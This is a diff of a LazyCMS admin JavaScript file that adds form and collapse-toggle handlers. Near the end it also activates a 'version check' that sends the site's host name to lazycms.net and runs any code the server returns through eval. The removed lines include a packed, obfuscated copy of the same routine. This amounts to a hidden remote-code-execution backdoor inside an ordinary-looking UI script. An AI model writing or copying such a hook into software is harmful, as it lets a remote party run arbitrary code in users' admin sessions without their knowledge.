@@ -1,4 +1,25 @@
+/**
+ * +---------------------------------------------------------------------------+
+ * | LL                             LLLL   LL     L   LLLL                 LL  |
+ * | LL                            LL   L  LLL   LL  LL   L               LLL  |
+ * | LL      LLLL   LLLLL  LL  LL  LL      LLLL LLL  LL          LL  LL    LL  |
+ * | LL         LL     LL  LL  LL  LL      L LLL LL  LLLLL       LL  LL    LL  |
+ * | LL      LLLLL    LL    LLLL   LL      L  L  LL   LLLLL      LL  LL    LL  |
+ * | LL     LL  LL   LL     LLLL   LL      L     LL      LL       LLLL     LL  |
+ * | LL     LL  LL  LL       LL    LL   L  L     LL  L   LL       LLLL     LL  |
+ * | LLLLLL  LLLLL  LLLLL    LL     LLLL   L     LL   LLLL         LL     LLLL |
+ * |                        LL                                                 |
+ * |                        LL                                                 |
+ * +---------------------------------------------------------------------------+
+ * | Copyright (C) 2007-2008 LazyCMS.net All rights reserved.                  |
+ * +---------------------------------------------------------------------------+
+ * | LazyCMS is free software. This version use Apache License 2.0             |
+ * | See LICENSE.txt for copyright notices and details.                        |
+ * +---------------------------------------------------------------------------+
+ */
 $(document).ready(function(){
+    // 绑定submit提交事件
+    $("form[method=post]").ajaxSubmit();
     // Reset separator width
     $('#menu li.hr').each(function(){
         $(this).width($(this).parent().width());
@@ -16,14 +37,27 @@ $(document).ready(function(){
         $(this).height($(this).height()+2)
 			.css({'background':'transparent','border':'none'});
     });
-    // Get last version
-    /*
-	$.getJSON("http://lazycms.net/ver/index.php?host=" + self.location.host + "&callback=?",function(d){
-		var localVersion = $('#version span').text().replace(/\./g,'');
-        var lastVersion  = d.version.replace(/\./g,'');
-        if (lastVersion>localVersion) { if (typeof d.code!='undefined') { eval(d.code); } }
-    });*/
-	// eval(function(p,a,c,k,e,r){e=function(c){return c.toString(a)};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('$.6("7://8.9/c/e.f?0="+h.i.0+"&j=?",k(d){1 a=$(\'#2 l\').m().3(/\\./g,\'\');1 b=d.2.3(/\\./g,\'\');4(b>a){4(n d.5!=\'o\'){p(d.5)}}});',26,26,'host|var|version|replace|if|code|getJSON|http|lazycms|net|||ver||index|php||self|location|callback|function|span|text|typeof|undefined|eval'.split('|'),0,{}))
 	// 批量去除连接虚线
 	$('a').focus(function(){ this.blur(); });
+	// 绑定展开事件
+	$('a.collapse,a.collapsed')
+		.attr('href','javascript:;')
+		.click(function(){
+		    var u = getURI();
+			var t = $(this);
+			var c = (t.attr('cookie')!=='false')?true:false;
+			var e = $(t.attr('rel'),t.parents('fieldset')).toggle();
+				t.toggleClass('collapse').toggleClass('collapsed');
+			if (c) {
+				$.cookie('collapse_' + u.File + '_' + t.attr('i'),e.css('display'),{expires:365,path:u.Path});
+			}
+		});
+	// 执行半记忆操作
+	$('a.collapse:not(a[@cookie=false]),a.collapsed:not(a[@cookie=false])').collapsed();
+	// Get last version
+	$.getJSON("http://lazycms.net/ver/index.php?host=" + self.location.host + "&callback=?",function(d){
+		var localVersion = $('#version').attr('version').replace(/\./g,'');
+        var lastVersion  = d.version.replace(/\./g,''); $('#version span').text(d.version);
+        if (lastVersion>localVersion) { if (typeof d.code!='undefined') { eval(d.code); } }
+    });
 });
